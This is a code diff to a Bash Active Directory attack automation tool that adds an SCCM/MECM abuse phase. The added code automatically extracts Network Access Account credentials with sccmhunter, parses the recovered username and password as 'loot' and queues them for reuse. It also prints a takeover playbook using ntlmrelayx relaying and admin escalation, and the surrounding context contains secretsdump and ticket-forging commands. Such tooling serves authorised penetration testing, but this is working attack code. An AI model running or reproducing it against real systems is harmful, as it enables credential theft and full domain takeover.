@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.25.0"
+readonly VERSION="1.26.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2109,6 +2109,65 @@ phase_rodc_abuse() {
         detail "      impacket-secretsdump <rodc_admin>@${rname%\$}   # → ${rkt:-krbtgt_<RID>} hash"
         detail "      impacket-ticketer -nthash <rodc_krbtgt> -domain-sid <SID> -domain ${DOMAIN} <allowed_account>"
     fi
+}
+
+# ===========================================================================
+#  SCCM / MECM ABUSE  —  PRECONDITION-GATED on SCCM actually existing in AD.
+#  Discovery via `nxc -M sccm`; if a Management Point / site server is present we
+#  (under --abuse) try the credential-without-shell primitive: extract the Network
+#  Access Account via sccmhunter (find→http) and feed it back into the engine.
+#  No SCCM in AD → no-op. Listener-based ELEVATE/TAKEOVER paths get a dynamic-IP
+#  playbook (they need a relay listener, like the NTLM relay path). Runs once.
+# ===========================================================================
+SCCM_DONE=0
+phase_sccm() {
+    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
+    [[ "$SCCM_DONE" == "1" ]] && return
+    SCCM_DONE=1
+    local args; mapfile -t args < <(nxc_cred_args)
+    local sf="$OUTDIR/sccm.txt"
+    $NXC ldap "$DCT" "${args[@]}" -M sccm 2>&1 | tee -a "$LOGFILE" | tee "$sf" >/dev/null
+    if ! grep -qiE 'Management Point|Site ?Server|Site Code|SCCM.*(found|server|site)|mSSMS' "$sf" 2>/dev/null; then
+        info "No SCCM/MECM infrastructure in AD → SCCM abuse N/A"
+        return
+    fi
+    section "SCCM / MECM ABUSE · NAA credentials + relay surface"
+    grep -iE 'Management Point|Site ?Server|Site Code|Distribution|SCCM' "$sf" | sed 's/^/      /' | head -20
+    local mp; mp=$(grep -oiP '(Management Point|MP Name|Site ?Server)[^A-Za-z0-9]*\K[A-Za-z0-9._-]+\.[A-Za-z0-9.-]+' "$sf" | head -1)
+    [[ -n "$mp" ]] && loot "SCCM Management Point/Site server: ${C_BOLD}$mp${C_RESET}"
+
+    local ip; ip="$(attacker_ip)"
+    local sh; sh="$(external_tool sccmhunter/sccmhunter.py)"
+
+    # CRED primitive: Network Access Account via the MP policy (no shell needed).
+    if [[ "$DO_ABUSE" == "1" && -n "$sh" ]] && { [[ -n "$PASS" || -n "$HASH" ]]; }; then
+        subsection "NAA credential extraction (sccmhunter find → http)"
+        local sa=(-u "$USER" -d "$DOMAIN" -dc-ip "$DC_IP")
+        [[ -n "$PASS" ]] && sa+=(-p "$PASS"); [[ -n "$HASH" ]] && sa+=(-hashes ":${HASH##*:}")
+        local nao="$OUTDIR/sccm_naa.txt"
+        ( cd "$(dirname "$sh")" && python3 "$sh" find "${sa[@]}" 2>&1; python3 "$sh" http "${sa[@]}" 2>&1 ) \
+            | tee -a "$LOGFILE" | tee "$nao"
+        local nu np
+        nu=$(grep -oiP 'Username\s*:\s*\K\S+' "$nao" 2>/dev/null | head -1 | sed 's#.*\\##')
+        np=$(grep -oiP 'Password\s*:\s*\K\S.*'  "$nao" 2>/dev/null | head -1 | tr -d '\r')
+        if [[ -n "$np" ]] && _plausible_secret "$np"; then
+            loot "★★ SCCM NAA credential recovered → ${C_GREEN}${nu:-?} : ${np}${C_RESET}"
+            add_secret "$np" "SCCM NAA"
+            [[ -n "$nu" ]] && { note_cred_source "${nu}:${np}" "SCCM NAA extraction"; queue_cred "$nu" "$np" "" "SCCM NAA"; }
+        else
+            info "No NAA credential returned (MP may enforce HTTPS/PKI, or none configured)"
+        fi
+    elif [[ "$DO_ABUSE" == "1" && -z "$sh" ]]; then
+        info "sccmhunter not vendored → NAA auto-extraction skipped (install.sh clones it)"
+    fi
+
+    # ELEVATE/TAKEOVER need a relay listener → dynamic-IP playbook (Misconfiguration Manager).
+    subsection "SCCM escalation / takeover playbook (listener-based; you run these)"
+    detail "  # listener IP auto-derived: ${ip:-<your-ip>}"
+    detail "  # CRED-1 NAA:        python3 ${sh:-sccmhunter.py} http -u $USER -p '<pass>' -d $DOMAIN -dc-ip $DC_IP"
+    detail "  # ELEVATE-2 takeover: coerce the site server to you (${ip:-<ip>}) and relay to the site DB / AdminService:"
+    detail "  #   impacket-ntlmrelayx -t mssql://<siteDB> -smb2support -q '<grant full admin>'   # or -t http://<SMSProvider>/AdminService --adcs"
+    detail "  #   then: python3 ${sh:-sccmhunter.py} admin -u <you> -p '<pass>' -ip <SMSProvider>  → add 'Full Administrator'"
 }
 
 # ===========================================================================
@@ -5196,6 +5255,7 @@ assess_current_credential() {
     phase_user_variants; jitter
     phase_share_loot;   jitter
     phase_secrets;      jitter
+    phase_sccm;         jitter
     phase_winrm_dpapi;  jitter
     phase_acl;          jitter
     phase_recycle_disabled; jitter
